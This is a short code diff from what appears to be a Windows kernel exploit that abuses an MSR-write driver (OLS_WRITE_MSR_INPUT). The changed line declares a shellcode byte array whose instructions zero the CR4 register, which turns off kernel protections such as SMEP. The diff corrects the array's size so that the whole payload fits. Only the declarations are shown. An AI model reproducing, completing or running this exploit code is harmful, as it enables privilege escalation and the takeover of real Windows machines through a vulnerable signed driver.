@@ -2,7 +2,7 @@
 
 int main(int argc, char** argv)
 {
-	char unused = 0, output[4096], * shellcode_alloc = 0, syscall[2] = { 0x48, 0x31, 0xC0, 0x0F, 0x22, 0xE0, 0xC3 };
+	char unused = 0, output[4096], * shellcode_alloc = 0, syscall[] = { 0x48, 0x31, 0xC0, 0x0F, 0x22, 0xE0, 0xC3 };
 	HANDLE h_driver = (HANDLE)-1;
 	OLS_WRITE_MSR_INPUT input;
 	unsigned long bytes_returned = 0, old_protection = 0;
